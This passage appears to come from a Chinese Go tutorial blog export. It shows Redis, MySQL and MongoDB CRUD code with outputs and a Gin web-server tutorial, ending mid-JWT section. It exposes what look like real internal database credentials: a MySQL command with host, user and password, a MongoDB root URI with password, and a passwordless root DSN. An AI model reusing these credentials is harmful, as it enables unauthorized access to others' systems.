// 批量入集合 err = rdb.SAdd(ctx, &quot;students&quot;, &quot;Alice&quot;, &quot;James&quot;, &quot;James&quot;).Err() if err != nil { fmt.Printf(&quot;redis SAdd失败，错误信息：%v\\n&quot;, err) } // 获取集合大小 size, err := rdb.SCard(ctx, &quot;students&quot;).Result() if err != nil { fmt.Printf(&quot;redis SCard失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis SCard成功，key：%s, size:%v\\n&quot;, &quot;students&quot;, size) //redis SCard成功，key：students, size:2 } // 返回集合所有元素 sMem, err := rdb.SMembers(ctx, &quot;students&quot;).Result() if err != nil { fmt.Printf(&quot;redis SMembers失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis SMembers成功，key：%s, size:%v\\n&quot;, &quot;students&quot;, sMem) //redis SMembers成功，key：students, size:[James Alice] } // 判断元素是否在集合中 flag, err := rdb.SIsMember(ctx, &quot;students&quot;, &quot;James&quot;).Result() if err != nil { fmt.Printf(&quot;redis SIsMember失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis SIsMember成功，key：%s, size:%v\\n&quot;, &quot;students&quot;, flag) //redis SIsMember成功，key：students, size:true } // 删除集合元素 err = rdb.SRem(ctx, &quot;students&quot;, &quot;Alice&quot;).Err() if err != nil { fmt.Printf(&quot;redis SRem失败，错误信息：%v\\n&quot;, err) } // =============================hash操作======================== // 多级嵌套HASH China 是hash Guangdong 是字段名, Tencent是字段值 err = rdb.HSet(ctx, &quot;China&quot;, &quot;Guangdong&quot;, &quot;Tencent&quot;).Err() if err != nil { fmt.Printf(&quot;redisHSet失败，错误信息：%v\\n&quot;, err) } hvar, err := rdb.HGet(ctx, &quot;China&quot;, &quot;Guangdong&quot;).Result() if err != nil { fmt.Printf(&quot;redis HGet失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis HGet成功，hvar:%v\\n&quot;, hvar) } err = rdb.HSet(ctx, &quot;China&quot;, &quot;Hanzhou&quot;, &quot;Alibaba&quot;).Err() if err != nil { fmt.Printf(&quot;redis HSet失败，错误信息：%v\\n&quot;, err) } // 返回的是个map hvarAll, err := rdb.HGetAll(ctx, &quot;China&quot;).Result() if err != nil { fmt.Printf(&quot;redis HGetAll失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis HGetAll成功，hvarAll:%v\\n&quot;, hvarAll) //redis HGetAll成功，hvarAll:map[Guangdong:Tencent Hanzhou:Alibaba] } // 将map塞进hash batchData := make(map[string]interface{}) batchData[&quot;username&quot;] = &quot;test&quot; batchData[&quot;password&quot;] = 123456 err = rdb.HMSet(ctx, &quot;users&quot;, batchData).Err() if err != nil { fmt.Printf(&quot;redis HMSet失败，错误信息：%v\\n&quot;, err) } hvarAll, err = rdb.HGetAll(ctx, &quot;users&quot;).Result() if err != nil { fmt.Printf(&quot;redis HGetAll失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis HGetAll成功，hvarAll:%v\\n&quot;, hvarAll) //redis HGetAll成功，hvarAll:map[password:123456 username:test] } // &quot;Hanzhou&quot;字段不存在才Set err = rdb.HSetNX(ctx, &quot;China&quot;, &quot;Hanzhou&quot;, &quot;Netease&quot;).Err() if err != nil { fmt.Printf(&quot;redis HSetNX失败，错误信息：%v\\n&quot;, err) } // 对key的值+n count, err := rdb.HIncrBy(ctx, &quot;users&quot;, &quot;password&quot;, 10).Result() if err != nil { fmt.Printf(&quot;redis HIncrBy失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis HIncrBy成功，count:%v\\n&quot;, count) // redis HIncrBy成功，count:123466 } // 返回所有key,返回值是个string数组 keys, err := rdb.HKeys(ctx, &quot;China&quot;).Result() if err != nil { fmt.Printf(&quot;redisHKeys失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis HKeys成功，keys:%v\\n&quot;, keys) //redis HKeys成功，keys:[Guangdong Hanzhou] } // 根据key，查询hash的字段数量 hlen, err := rdb.HLen(ctx, &quot;China&quot;).Result() if err != nil { fmt.Printf(&quot;redis HLen失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis HLen成功，hlen:%v\\n&quot;, hlen) // redis HLen成功，hlen:2 } //删除多个key err = rdb.HDel(ctx, &quot;China&quot;, &quot;Hanzhou&quot;, &quot;Guangdong&quot;).Err() if err != nil { fmt.Printf(&quot;redis HDel失败，错误信息：%v\\n&quot;, err) } //================================有序集合sort set================================================ /* // Z 表示已排序的集合成员 type Z struct { Score float64 // 分数 Member interface{} // 元素名 } */ zsetKey := &quot;companys_rank&quot; companys := []*redis.Z{ {Score: 100.0, Member: &quot;Apple&quot;}, {Score: 90.0, Member: &quot;MicroSoft&quot;}, {Score: 70.0, Member: &quot;Amazon&quot;}, {Score: 87.0, Member: &quot;Google&quot;}, {Score: 77.0, Member: &quot;Facebook&quot;}, {Score: 67.0, Member: &quot;Tesla&quot;}, } err = rdb.ZAdd(ctx, zsetKey, companys...).Err() if err != nil { fmt.Printf(&quot;redis ZAdd失败，错误信息：%v\\n&quot;, err) } err = rdb.ZIncrBy(ctx, zsetKey, 2, &quot;Amazon&quot;).Err() if err != nil { fmt.Printf(&quot;redis ZIncrBy失败，错误信息：%v\\n&quot;, err) } //返回从0到-1位置的集合元素， 元素按分数从小到大排序 rank, err := rdb.ZRange(ctx, zsetKey, 0, -1).Result() if err != nil { fmt.Printf(&quot;redis ZRange失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis ZRange成功，rank:%v\\n&quot;, rank) //redis ZRange成功，rank:[Tesla Amazon Facebook Google MicroSoft Apple] } //返回top3 rank, err = rdb.ZRange(ctx, zsetKey, -3, -1).Result() if err != nil { fmt.Printf(&quot;redis ZRange失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis ZRange成功，rank:%v\\n&quot;, rank) //redis ZRange成功，rank:[Google MicroSoft Apple] } op := &amp;redis.ZRangeBy{ Min:&quot;80&quot;, // 最小分数 Max:&quot;100&quot;, // 最大分数 Offset:0, // 类似sql的limit, 表示开始偏移量 Count:2, // 一次返回多少数据 } ///根据分数范围返回集合元素，实现排行榜，取top n rank, err = rdb.ZRangeByScore(ctx, zsetKey, op).Result() if err != nil { fmt.Printf(&quot;redis ZRangeByScore失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis ZRangeByScore成功，rank:%v\\n&quot;, rank) //redis ZRangeByScore成功，rank:[Google MicroSoft] } //根据元素名，查询集合元素在集合中的排名，从0开始算，集合元素按分数从小到大排序 rk, err := rdb.ZRank(ctx, zsetKey, &quot;Apple&quot;).Result() if err != nil { fmt.Printf(&quot;redis ZRank失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis ZRank成功，rk:%v\\n&quot;, rk) // redis ZRank成功，rk:5 } // 一次删除多个key err = rdb.ZRem(ctx, zsetKey, &quot;Apple&quot;, &quot;Amazon&quot;).Err() if err != nil { fmt.Printf(&quot;redis ZRem失败，错误信息：%v\\n&quot;, err) } //集合元素按分数排序，从最低分到高分，删除第0个元素到第1个元素。 这里相当于删除最低分的2个元素 err = rdb.ZRemRangeByRank(ctx, zsetKey, 0, 1).Err() if err != nil { fmt.Printf(&quot;redis ZRemRangeByRank失败，错误信息：%v\\n&quot;, err) } rank, err = rdb.ZRange(ctx, zsetKey, 0, -1).Result() if err != nil { fmt.Printf(&quot;redis ZRange失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis ZRange成功，rank:%v\\n&quot;, rank) //redis ZRange成功，rank:[Google MicroSoft] } } 输出 1234567891011121314151617181920212223242526272829303132成功连接redis, PONGredis get成功，key：guid, val:89_1909979_2232118redis Del成功，key：guidredis get失败，错误信息：redis: nilredis TTL成功，key：task, tm:-1nsredis get成功，key：task, val:456redis get成功，key：task, val:456redis GetSet成功，key：task, oldVal:456redis MGet成功，vals：[val1 val2 val3]redis get成功，key：age, val:60redis TTL成功，key：key1, tm:3sredis LRange成功，key：uids, vals:[132 154 140 130 130]redis LRange成功，key：uids, vals:[140 130 130]redis LLen成功，key：uids, llen:5redis LRange成功，key：uids, vals:[132 154 1000 130 130]redis LRange成功，key：uids, vals:[132 154 1000 130]redis LRange成功，key：uids, vals:[132 154 1000]redis SCard成功，key：students, size:2redis SMembers成功，key：students, size:[Alice James]redis SIsMember成功，key：students, size:trueredis HGet成功，hvar:Tencentredis HGetAll成功，hvarAll:map[Guangdong:Tencent Hanzhou:Alibaba]redis HGetAll成功，hvarAll:map[password:123456 username:test]redis HIncrBy成功，count:123466redis HKeys成功，keys:[Guangdong Hanzhou]redis HLen成功，hlen:2redis ZRange成功，rank:[Tesla Amazon Facebook Google MicroSoft Apple]redis ZRange成功，rank:[Google MicroSoft Apple]redis ZRangeByScore成功，rank:[Google MicroSoft]redis ZRank成功，rk:5redis ZRange成功，rank:[Google MicroSoft] Mysql命令行连接msyql 1mysql -h mhxy-dev-130073-m.hz.dumbo.nie.netease.com -P 3306 -uxy1 -pmhxygamekingxy -A mysql的CRUD实践案例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889package mainimport ( &quot;fmt&quot; _ &quot;github.com/go-sql-driver/mysql&quot; &quot;github.com/jmoiron/sqlx&quot;)type Person struct { Cguid string `db:&quot;cguid&quot;` Username string `db:&quot;name&quot;`}var Db *sqlx.DB//init()函数会在每个包完成初始化后自动执行，并且执行优先级比main函数高。func init() { database, err := sqlx.Open(&quot;mysql&quot;, &quot;root:@tcp(inner.mhxy.nie.netease.com)/pyc2021&quot;) if err != nil { fmt.Println(&quot;open mysql failed,&quot;, err) return } Db = database}func main() { // 查询 var person []Person err := Db.Select(&amp;person, &quot;select cguid, name from pyc2021_match limit 10;&quot;) if err != nil { fmt.Println(&quot;exec failed, &quot;, err) return } fmt.Println(&quot;select succ:&quot;, person) //通过Db.Select方法将查询的多行数据保存在一个切片中，然后就可以通过循环的方式获取每行数据 for _, info := range person { cguid := info.Cguid name := info.Username fmt.Println(&quot;mysql select, &quot;, cguid, name) } // 插入 r, err := Db.Exec(&quot;insert into pyc2021_match(cguid, vote, name, hostnum)values('781122223', 200, '这是一个测试', 90)&quot;) if err != nil { fmt.Println(&quot;exec failed, &quot;, err) return } id, err := r.LastInsertId() if err != nil { fmt.Println(&quot;exec failed, &quot;, err) return } fmt.Println(&quot;insert succ:&quot;, id) // 更新 res, err := Db.Exec(&quot;update pyc2021_match set name='修改测试' where cguid='98977999'&quot;) if err != nil { fmt.Println(&quot;exec failed, &quot;, err) return } row, err := res.RowsAffected() if err != nil { fmt.Println(&quot;rows failed, &quot;,err) } fmt.Println(&quot;update succ:&quot;,row) // 删除 res, err = Db.Exec(&quot;delete from pyc2021_match where cguid='98977999'&quot;) if err != nil { fmt.Println(&quot;exec failed, &quot;, err) return } row,err = res.RowsAffected() if err != nil { fmt.Println(&quot;rows failed, &quot;,err) } fmt.Println(&quot;delete succ: &quot;,row) Db.Close()} 输出： 123456789101112select succ: [{7822223 xxxx1} {7832223 xsxxx1} {7832233 xsx99} {22223 西红柿} {98977999 修改测试} {78222223 这是一个测试} {78122223 这是一个测试}]mysql select, 7822223 xxxx1mysql select, 7832223 xsxxx1mysql select, 7832233 xsx99mysql select, 22223 西红柿mysql select, 98977999 修改测试mysql select, 78222223 这是一个测试mysql select, 78122223 这是一个测试insert succ: 12update succ: 0delete succ: 1 Mongodb命令行连接mongodb 1mongo mongodb://root:123@127.0.0.1:30002/xyq mongodb的CRUD实践如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162package main//https://github.com/tfogo/mongodb-go-tutorialimport ( &quot;go.mongodb.org/mongo-driver/bson&quot; //BOSN解析包 &quot;go.mongodb.org/mongo-driver/mongo&quot; //MongoDB的Go驱动包 &quot;go.mongodb.org/mongo-driver/mongo/options&quot; &quot;fmt&quot; &quot;log&quot; &quot;context&quot;)type Users struct { Cguid string `bson:&quot;cguid&quot;` Uid int `bson:&quot;uid&quot;` Text string `bson:&quot;text&quot;` Name string `bson:&quot;name&quot;`}func main() { //var ctx context.Context clientOptions := options.Client().ApplyURI(&quot;mongodb://root:mhxygameking@192.168.44.105:30002/xyq&quot;) // 建立客户端连接 client, err := mongo.Connect(context.TODO(), clientOptions) if err != nil { log.Fatal(err) fmt.Println(err) } // 检查连接情况 err = client.Ping(context.TODO(), nil) if err != nil { log.Fatal(err) fmt.Println(err) } fmt.Println(&quot;Connected to MongoDB!&quot;) //指定要操作的数据集 // collection := client.Database(&quot;xyq&quot;).Collection(&quot;ljs_test&quot;) collection := client.Database(&quot;xyq&quot;).Collection(&quot;pyc2021_rank&quot;) //执行增删改查操作 //插入一条数据 newUser := Users{&quot;89_34122417_1642765091&quot;, 129829, &quot;新的文本&quot;, &quot;sorrymaker&quot;} res, err := collection.InsertOne(context.TODO(), newUser) if err != nil { log.Fatal(err) } fmt.Println(&quot;Inserted document: &quot;, res.InsertedID) //插入多条数据 newUser1 := Users{&quot;89_21932437_1643320091&quot;, 139829, &quot;新的文本1&quot;, &quot;sorrymaker&quot;} newUser2 := Users{&quot;89_31933227_164442021&quot;, 139129, &quot;新的文本2&quot;, &quot;sorrymaker&quot;} newUser3 := Users{&quot;89_41931237_1642121091&quot;, 139429, &quot;新的文本3&quot;, &quot;sorrymaker&quot;} news := []interface{}{newUser1, newUser2, newUser3} res1, err := collection.InsertMany(context.TODO(), news) if err != nil { log.Fatal(err) } fmt.Println(&quot;Inserted document: &quot;, res1.InsertedIDs) // 查找一个数据 var user Users filter := bson.D{{&quot;cguid&quot;, &quot;89_22932237_1649720099&quot;}} if err = collection.FindOne(context.TODO(),filter).Decode(&amp;user); err != nil{ fmt.Println(err) return } fmt.Printf(&quot;result:%+v\\n&quot;, user) //查找多个符合条件的数据 findOptions := options.Find() findOptions.SetLimit(10) //限制返回的条目 var results []*Users filter = bson.D{{&quot;name&quot;, &quot;sorrymaker&quot;}} cur, err := collection.Find(context.TODO(), filter, findOptions) if err != nil { fmt.Println(err) return } for cur.Next(context.TODO()) { var elem Users err := cur.Decode(&amp;elem) if err != nil { fmt.Println(err) return } fmt.Printf(&quot;elem:%+v\\n&quot;, elem) results = append(results, &amp;elem) } if err := cur.Err(); err != nil { fmt.Println(err) return } cur.Close(context.TODO()) //更新数据 filter = bson.D{{&quot;name&quot;, &quot;sorrymaker&quot;}} update := bson.D{{&quot;$set&quot;, bson.D{{&quot;text&quot;, &quot;修改成功&quot;}}}} updateResult, err := collection.UpdateOne(context.TODO(), filter, update) if err != nil { log.Fatal(err) } fmt.Printf(&quot;Updated documents: %+v\\n&quot;, updateResult) //更新多条数据 filter = bson.D{{&quot;name&quot;, &quot;sorrymaker&quot;}} update = bson.D{{&quot;$set&quot;, bson.D{{&quot;text&quot;, &quot;udatemany修改成功&quot;}}}} updateResults, err := collection.UpdateMany(context.TODO(), filter, update) if err != nil { log.Fatal(err) } fmt.Printf(&quot;UpdateMany documents: %+v\\n&quot;, updateResults) //更新数据，不存在就插入。upsert filter = bson.D{{&quot;cguid&quot;, &quot;89_22932437_1643120029&quot;}} update = bson.D{{&quot;$set&quot;, bson.D{{&quot;text&quot;, &quot;修改成功upsert&quot;}, {&quot;cguid&quot;, &quot;89_22932437_1643120029&quot;}, {&quot;uid&quot;,1982938}, {&quot;name&quot;, &quot;losjo&quot;}}}} updateOpts := options.Update().SetUpsert(true) // 设置upsert模式 updateResult, err = collection.UpdateOne(context.TODO(), bson.M{}, update, updateOpts) if err != nil { log.Fatal(err) } fmt.Printf(&quot;Upsert documents: %+v\\n&quot;, updateResult) // 删除一条数据 filter = bson.D{{&quot;cguid&quot;, &quot;89_34922417_1641725099&quot;}} deleteResult, err := collection.DeleteOne(context.TODO(), filter) if err != nil { log.Fatal(err) } fmt.Printf(&quot;deleteone documents: %+v\\n&quot;, deleteResult) //给字段加索引 indexModel := mongo.IndexModel{ Keys: bson.D{ {&quot;name&quot;, 1}, }, } _, err = collection.Indexes().CreateOne(context.TODO(), indexModel) if err != nil { log.Fatal(err) } // 断开客户端连接 err = client.Disconnect(context.TODO()) if err != nil { log.Fatal(err) } fmt.Println(&quot;Connection to MongoDB closed.&quot;)} 输出： 12345678910111213141516171819Connected to MongoDB!Inserted document: ObjectID(&quot;60a0a872d7ed08cd629ddabd&quot;)Inserted document: [ObjectID(&quot;60a0a872d7ed08cd629ddabe&quot;) ObjectID(&quot;60a0a872d7ed08cd629ddabf&quot;) ObjectID(&quot;60a0a872d7ed08cd629ddac0&quot;)]result:{Cguid:89_22932237_1649720099 Uid:139829 Text:udatemany修改成功 Name:sorrymaker}elem:{Cguid:89_32933237_1644720299 Uid:139129 Text:udatemany修改成功 Name:sorrymaker}elem:{Cguid:89_42931237_1642721099 Uid:139429 Text:udatemany修改成功 Name:sorrymaker}elem:{Cguid:89_42931237_1642121099 Uid:139429 Text:udatemany修改成功 Name:sorrymaker}elem:{Cguid:89_42931237_1649721099 Uid:139429 Text:udatemany修改成功 Name:sorrymaker}elem:{Cguid:89_32932417_1649725099 Uid:129829 Text:udatemany修改成功 Name:sorrymaker}elem:{Cguid:89_22932237_1643720099 Uid:139829 Text:udatemany修改成功 Name:sorrymaker}elem:{Cguid:89_32932237_1649720099 Uid:129829 Text:udatemany修改成功 Name:sorrymaker}elem:{Cguid:89_32932237_1619720099 Uid:129829 Text:udatemany修改成功 Name:sorrymaker}elem:{Cguid:89_32933237_1649720299 Uid:139129 Text:udatemany修改成功 Name:sorrymaker}elem:{Cguid:89_22933237_1649720299 Uid:139129 Text:udatemany修改成功 Name:sorrymaker}Updated documents: &amp;{MatchedCount:1 ModifiedCount:1 UpsertedCount:0 UpsertedID:&lt;nil&gt;}UpdateMany documents: &amp;{MatchedCount:31 ModifiedCount:5 UpsertedCount:0 UpsertedID:&lt;nil&gt;}Upsert documents: &amp;{MatchedCount:1 ModifiedCount:1 UpsertedCount:0 UpsertedID:&lt;nil&gt;}deleteone documents: &amp;{DeletedCount:1}Connection to MongoDB closed.","link":"/2021/05/16/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8-redis-mysql-mongodb/"},{"title":"Go快速上手—Web服务器篇","text":"Go的一个比较流行的HTTP后台框架是Gin，若要搭建Go的HTTP后台，推荐直接学习Gin。 Gin简介Gin 特性 快速：路由不使用反射，基于Radix树，内存占用少。 中间件：HTTP请求，可先经过一系列中间件处理，例如：Logger，Authorization，GZIP等。这个特性和 NodeJs 的 Koa 框架很像。中间件机制也极大地提高了框架的可扩展性。 异常处理：服务始终可用，不会宕机。Gin 可以捕获 panic，并恢复。而且有极为便利的机制处理HTTP请求过程中发生的错误。 JSON：Gin可以解析并验证请求的JSON。这个特性对Restful API的开发尤其有用。 路由分组：例如将需要授权和不需要授权的API分组，不同版本的API分组。而且分组可嵌套，且性能不受影响。 渲染内置：原生支持JSON，XML和HTML的渲染。 安装 go env -w GO111MODULE=on go env -w GOPROXY=https://goproxy.io,direct 设置后，重新运行： go get -u github.com/gin-gonic/gin， 在项目文件夹下运行 go mod init gin 在项目文件夹下运行 go mod edit -require github.com/gin-gonic/gin@latest 一个最基本的web框架实践一个最简单的web框架，实现了get和post两种方式，幷绑定了端口9999进行监听。实现的基本功能： 绑定指定端口9999进行监听 实现了get和post两种方式 实现了路由解析，不同的路由会由对用的函数进行处理请求 实现了解析请求格式为query string的请求 实现了解析参数格式为json的请求 实现了json响应的回复 路由方法有 GET, POST, PUT, PATCH, DELETE 和 OPTIONS，还有Any，可匹配以上任意类型的请求。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980package mainimport ( &quot;github.com/gin-gonic/gin&quot; &quot;net/http&quot; &quot;fmt&quot;)func HelloWeb(c *gin.Context) { c.String(http.StatusOK, &quot;Hello, Go\\n&quot;)}func HiWeb(c *gin.Context) { c.String(http.StatusOK, &quot;Hi, Go\\n&quot;)}// 解析query string， 匹配users?name=xxx&amp;role=xxx&amp;age=xx，role可选func QueryUser(c *gin.Context) { name := c.Query(&quot;name&quot;) age := c.Query(&quot;age&quot;) role := c.DefaultQuery(&quot;role&quot;, &quot;teacher&quot;) resp := fmt.Sprintf(&quot;my name is %s, my age is %s, my role is %s\\n&quot;, name, age, role) c.String(http.StatusOK, resp)}type Login struct { User string `json:&quot;user&quot;` Password string `json:&quot;password&quot;`}// 解析json格式的请求func LoginCheck(c *gin.Context) { var req Login if err := c.ShouldBindJSON(&amp;req); err != nil { c.JSON(http.StatusBadRequest, gin.H{&quot;error&quot;: err.Error()}) return } resp := gin.H{&quot;message&quot;: &quot;someJSON&quot;, &quot;status&quot;: 200} c.JSON(http.StatusOK, resp)} type Response struct { Name string Message string Status int}func LoginCheck2(c *gin.Context) { var req Login if err := c.ShouldBindJSON(&amp;req); err != nil { c.JSON(http.StatusBadRequest, gin.H{&quot;error&quot;: err.Error()}) return } var resp Response resp.Name = req.User resp.Message = &quot;OKOK&quot; resp.Status = 200 c.JSON(http.StatusOK, resp)}func main() { r := gin.Default() r.GET(&quot;/hello&quot;, func(c *gin.Context) { HelloWeb(c) }) r.POST(&quot;/hi&quot;, func(c *gin.Context) { HiWeb(c) }) r.GET(&quot;/user&quot;, func(c *gin.Context) { QueryUser(c) }) r.POST(&quot;/login&quot;, func(c *gin.Context) { LoginCheck(c) }) r.POST(&quot;/login2&quot;, func(c *gin.Context) { LoginCheck2(c) }) r.Run(&quot;:9999&quot;) // listen and serve on 0.0.0.0:9999} 访问对应的URL 12345678910111213junshideMacBook-Pro:~ junshili$ curl -X POST http://localhost:9999/hiHi, GojunshideMacBook-Pro:~ junshili$ curl http://localhost:9999/helloHello, GojunshideMacBook-Pro:~ junshili$ curl &quot;http://localhost:9999/user?name=James&amp;age=19&amp;role=student&quot;my name is James, my age is 19, my role is studentcurl -X POST http://localhost:9999/login -d '{&quot;user&quot;:&quot;kk&quot;, &quot;password&quot;:&quot;123&quot;}' -H &quot;content-type:application/json&quot;{&quot;message&quot;:&quot;someJSON&quot;,&quot;status&quot;:200}junshideMacBook-Pro:~ junshili$ curl -X POST http://localhost:9999/login2 -d '{&quot;user&quot;:&quot;kk&quot;, &quot;password&quot;:&quot;123&quot;}' -H &quot;content-type:application/json&quot;{&quot;Name&quot;:&quot;kk&quot;,&quot;Message&quot;:&quot;OKOK&quot;,&quot;Status&quot;:200} 一个带有复杂路由项目实践当项目大到一定程度后，上面再main.go里写处理函数的方式已经不再适用，一个更合适的方法是把处理函数迁移到一个文件里单独写逻辑，而main.go里越简单越好，只做路由选择，不做业务函数的实现。 因此，项目按照该树结构来组织，routers放各个业务代码的实现，一个文件对应一个子业务，比如这里的login和user。main.go里不再写业务逻辑，唯一的功能就是做路由注册（调用SetupUserRouter）。这样一来，复杂的web项目也能清晰管理了。 main.go 12345678910111213141516package mainimport ( &quot;fmt&quot; &quot;web_demo/routers&quot; &quot;github.com/gin-gonic/gin&quot;)func main() { r := gin.Default() routers.SetupUserRouter(r) routers.SetupLoginRouter(r) if err := r.Run(&quot;:9999&quot;); err != nil { fmt.Println(&quot;startup service failed, err:%v\\n&quot;, err) }} user.go 1234567891011121314151617181920package routersimport ( &quot;net/http&quot; &quot;github.com/gin-gonic/gin&quot; &quot;fmt&quot;)// 解析query string， 匹配users?name=xxx&amp;role=xxx&amp;age=xx，role可选func QueryUser(c *gin.Context) { name := c.Query(&quot;name&quot;) age := c.Query(&quot;age&quot;) role := c.DefaultQuery(&quot;role&quot;, &quot;teacher&quot;) resp := fmt.Sprintf(&quot;my name is %s, my age is %s, my role is %s\\n&quot;, name, age, role) c.String(http.StatusOK, resp)}func SetupUserRouter(e *gin.Engine) { e.GET(&quot;/users&quot;, QueryUser)} login.go 12345678910111213141516171819202122232425package routersimport ( &quot;net/http&quot; &quot;github.com/gin-gonic/gin&quot;)type Login struct { User string `json:&quot;user&quot;` Password string `json:&quot;password&quot;`}// 解析json格式的请求func LoginCheck(c *gin.Context) { var req Login if err := c.ShouldBindJSON(&amp;req); err != nil { c.JSON(http.StatusBadRequest, gin.H{&quot;error&quot;: err.Error()}) return } resp := gin.H{&quot;message&quot;: &quot;someJSON&quot;, &quot;status&quot;: 200} c.JSON(http.StatusOK, resp)}func SetupLoginRouter(e *gin.Engine) { e.POST(&quot;/login&quot;, LoginCheck)} 请求和响应 12345junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:9999/users?name=James&amp;age=19&amp;role=student&quot;my name is James, my age is 19, my role is studentjunshideMacBook-Pro:web junshili$ curl -X POST http://localhost:9999/login -d '{&quot;user&quot;:&quot;kk&quot;, &quot;password&quot;:&quot;123&quot;}' -H &quot;content-type:application/json&quot;{&quot;message&quot;:&quot;someJSON&quot;,&quot;status&quot;:200} 分组路由如果有一组路由，前缀都是/api/v1开头，是否每个路由都需要加上/api/v1这个前缀呢？答案是不需要，分组路由可以解决这个问题。利用分组路由还可以更好地实现权限控制，例如将需要登录鉴权的路由放到同一分组中去，简化权限控制。 比如我们改写login.go，请求URL调整为login/logincheck2和login/logincheck这两个路径，此时我们使用Group函数即可。 1234567891011121314151617181920212223242526272829303132333435363738package routersimport ( &quot;net/http&quot; &quot;github.com/gin-gonic/gin&quot;)type Login struct { User string `json:&quot;user&quot;` Password string `json:&quot;password&quot;`}// 解析json格式的请求func LoginCheck(c *gin.Context) { var req Login if err := c.ShouldBindJSON(&amp;req); err != nil { c.JSON(http.StatusBadRequest, gin.H{&quot;error&quot;: err.Error()}) return } resp := gin.H{&quot;message&quot;: &quot;someJSON&quot;, &quot;status&quot;: 200} c.JSON(http.StatusOK, resp)}// 解析json格式的请求func LoginCheck2(c *gin.Context) { var req Login if err := c.ShouldBindJSON(&amp;req); err != nil { c.JSON(http.StatusBadRequest, gin.H{&quot;error&quot;: err.Error()}) return } resp := gin.H{&quot;message&quot;: &quot;someJSON2&quot;, &quot;status&quot;: 200} c.JSON(http.StatusOK, resp)}func SetupLoginRouter(e *gin.Engine) { v1 := e.Group(&quot;/login&quot;) v1.POST(&quot;/logincheck&quot;, LoginCheck) v1.POST(&quot;/logincheck2&quot;, LoginCheck2)} 请求和响应 12junshideMacBook-Pro:web junshili$ curl -X POST http://localhost:9999/login/logincheck2 -d '{&quot;user&quot;:&quot;kk&quot;, &quot;password&quot;:&quot;123&quot;}' -H &quot;content-type:application/json&quot;{&quot;message&quot;:&quot;someJSON2&quot;,&quot;status&quot;:200} 重定向http 关于重定向的状态码：301，302 301 redirect: 301 代表永久性转移(Permanently Moved) 302 redirect: 302 代表暂时性转移(Temporarily Moved ) 301表示旧地址A的资源已经被永久地移除了（这个资源不可访问了），搜索引擎在抓取新内容的同时也将旧的网址交换为重定向之后的网址； 302表示旧地址A的资源还在（仍然可以访问），这个重定向只是临时地从旧地址A跳转到地址B，搜索引擎会抓取新的内容而保存旧的网址。 修改users.go，实现永久重定向 123456789func SetupUserRouter(e *gin.Engine) { v1 := e.Group(&quot;/users&quot;) v1.GET(&quot;/user&quot;, QueryUser) v1.GET(&quot;/redirect&quot;, func(c *gin.Context) { c.Redirect(http.StatusMovedPermanently, &quot;/users&quot;) })} 请求和响应，通过响应可以看到，该url已经被重定向到/index了，请求发起者可以根据这个回复重新调整自己的请求路径。 12junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:9999/users/redirect?name=James&amp;age=19&amp;role=student&quot;&lt;a href=&quot;/index&quot;&gt;Moved Permanently&lt;/a&gt;. 同步异步 goroutine机制可以方便地实现异步处理 另外，在启动新的goroutine时，不应该使用原始上下文，必须使用它的只读副本 考虑这样的场景：客户端请求web服务器进行一个复杂计算，这个计算任务耗时比较久，因此一个比较好的做法是异步处理，客户端只是提交计算任务，服务器收到任务后把任务存储进消息队列，就直接回复客户端任务已收到，断开本次连接，待消息队列的任务被处理完后，再主动发起请求通知客户端。这个就是一个典型的异步处理的场景。 12345678910111213141516171819202122232425262728293031package mainimport ( &quot;fmt&quot; &quot;github.com/gin-gonic/gin&quot; &quot;time&quot; &quot;net/http&quot;)func main() { r := gin.Default() // 同步 r.GET(&quot;/sync&quot;, func(c *gin.Context) { time.Sleep(3 * time.Second) fmt.Println(&quot;同步执行：&quot;, c.Request.URL.Path) c.String(http.StatusOK, &quot;同步执行&quot;) }) // 异步 r.GET(&quot;/async&quot;, func(c *gin.Context) { // 需要搞一个副本 copyContext := c.Copy() // 异步处理 go func() { time.Sleep(3 * time.Second) fmt.Println(&quot;异步执行：&quot; + copyContext.Request.URL.Path) }() c.String(http.StatusOK, &quot;异步执行&quot;) }) r.Run() // listen and serve on 0.0.0.0:8080} 请求和响应，可以看出异步请求是秒回的，而同步请求花费了3s。 1234567891011junshideMacBook-Pro:web junshili$ time curl &quot;http://localhost:8080/async&quot;异步执行real 0m0.017suser 0m0.007ssys 0m0.007sjunshideMacBook-Pro:web junshili$ time curl &quot;http://localhost:8080/sync&quot;同步执行real 0m3.021suser 0m0.008ssys 0m0.008s token令牌Web服务器中身份验证是个重要的功能，比如app用户需要先登录才能操作一些内部功能。其中令牌身份验证是个常用的手段。 JSON Web令牌（JWT）作为令牌系统而不是在每次请求时都发送用户名和密码，因此比其他方法（如基本身份验证）具有固有的优势。JWT主要有两个部分：提供用户名和密码以获取令牌；并根据请求检查该令牌。 jwt由以下三部分构成： Header:头部 （对应：Header） Claims:声明 (对应：Payload) Signature:签名 (对应：Signature) Header头部Header中指明jwt的签名算法，如 1234{ &quot;typ&quot;: &quot;JWT&quot;, 